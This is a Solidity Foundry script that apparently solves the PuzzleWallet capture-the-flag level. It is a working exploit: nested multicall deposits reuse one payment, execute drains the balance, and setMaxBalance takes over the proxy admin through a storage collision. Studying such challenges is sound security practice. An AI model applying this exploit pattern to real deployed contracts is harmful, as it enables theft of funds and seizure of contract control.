// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/PuzzleWallet.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackPuzzleWallet {
    function attack(
        PuzzleWallet puzzleWalletInstance,
        address _newAdmin
    ) external payable {
        bytes[] memory multicall1 = new bytes[](2);
        bytes[] memory nestedMulticall = new bytes[](1);

        multicall1[0] = abi.encodeCall(PuzzleWallet.deposit, ());

        nestedMulticall[0] = abi.encodeCall(PuzzleWallet.deposit, ());

        multicall1[1] = abi.encodeCall(
            PuzzleWallet.multicall,
            (nestedMulticall)
        );

        puzzleWalletInstance.multicall{value: 0.001 ether}(multicall1);
        console.log(puzzleWalletInstance.balances(address(this)));
        puzzleWalletInstance.execute(address(this), 0.002 ether, "");
        puzzleWalletInstance.setMaxBalance(uint256(uint160(_newAdmin)));
    }

    receive() external payable {}
}

contract PuzzleWalletSolution is Script {
    PuzzleWallet constant puzzleWalletInstance =
        PuzzleWallet(0x75AAF7933f73465178714F1717aBB50fB1b499d3);
    PuzzleProxy constant puzzleProxyInstance =
        PuzzleProxy(payable(0x75AAF7933f73465178714F1717aBB50fB1b499d3));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        puzzleProxyInstance.proposeNewAdmin(vm.envAddress("MY_ADDRESS"));

        AttackPuzzleWallet attackPuzzleWallet = new AttackPuzzleWallet();

        puzzleWalletInstance.addToWhitelist(address(attackPuzzleWallet));
        attackPuzzleWallet.attack{value: 0.001 ether}(
            puzzleWalletInstance,
            vm.envAddress("MY_ADDRESS")
        );

        require(puzzleProxyInstance.admin() == vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
